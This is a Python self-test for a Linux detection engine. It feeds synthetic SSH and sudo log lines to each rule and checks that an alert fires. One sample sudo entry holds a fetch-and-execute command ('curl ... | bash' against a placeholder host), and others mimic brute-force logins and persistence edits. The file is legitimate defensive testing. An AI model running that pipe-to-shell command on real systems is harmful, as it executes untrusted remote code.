"""Rule self-test: feed each Linux rule a synthetic log line in a throw-away engine and
confirm it fires. Proves the detection logic works end to end (parse -> rule -> alert).
It never touches the live engine, alerts or logs."""

from typing import Any, Dict, List

from alpha_sentinel.catalog import ALL_LINUX_RULE_KEYS
from alpha_sentinel.engine import Engine
from alpha_sentinel.normalize import normalize_linux_event
from alpha_sentinel.rules import evaluate_event

H = "selftest-host"


def _fail(n: int, minute: int = 0) -> str:
    return f"Oct 29 10:{minute:02d}:{n:02d} {H} sshd[1]: Failed password for root from 203.0.113.5 port 22 ssh2"


def _sudo(cmd: str) -> str:
    return f"Oct 29 10:00:00 {H} sudo:   alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND={cmd}"


CASES: Dict[str, List[str]] = {
    "ssh_bruteforce": [_fail(i) for i in range(1, 7)],
    "ssh_success_after_failures": [_fail(1), _fail(2), _fail(3),
                                   f"Oct 29 10:05:00 {H} sshd[1]: Accepted password for alice from 203.0.113.5 port 22 ssh2"],
    "root_ssh_login": [f"Oct 29 10:00:00 {H} sshd[1]: Accepted publickey for root from 198.51.100.7 port 22 ssh2"],
    "ssh_key_auth": [f"Oct 29 10:00:00 {H} sshd[1]: Accepted publickey for deploy from 198.51.100.7 port 22 ssh2"],
    "user_account_changed": [_sudo("/usr/sbin/useradd bob")],
    "cron_or_systemd_persistence": [_sudo("/usr/bin/crontab -e")],
    "sudo_privilege_escalation": [_sudo("/bin/ls /root")],
    "suspicious_command_execution": [_sudo("/usr/bin/curl http://x/y.sh | bash")],
    "ssh_authorized_keys_modified": [_sudo("/usr/bin/nano /home/bob/.ssh/authorized_keys")],
    "sshd_config_modified": [_sudo("/usr/bin/nano /etc/ssh/sshd_config")],
}


def run_selftest() -> Dict[str, Any]:
    results = []
    for key in ALL_LINUX_RULE_KEYS:
        lines = CASES.get(key)
        if not lines:
            results.append({"key": key, "ok": False, "detail": "no test case"})
            continue
        eng = Engine()
        try:
            for line in lines:
                ev = normalize_linux_event(line)
                if ev is None:
                    raise ValueError("line was not parsed")
                evaluate_event(eng, ev)
            fired = {a.RuleKey for a in eng.alerts}
            ok = key in fired
            results.append({"key": key, "ok": ok,
                            "detail": "fired" if ok else "did not fire (fired: " + (", ".join(sorted(fired)) or "nothing") + ")"})
        except Exception as exc:  # noqa: BLE001
            results.append({"key": key, "ok": False, "detail": f"error: {exc}"})
    passed = sum(1 for r in results if r["ok"])
    return {"passed": passed, "total": len(results), "results": results}
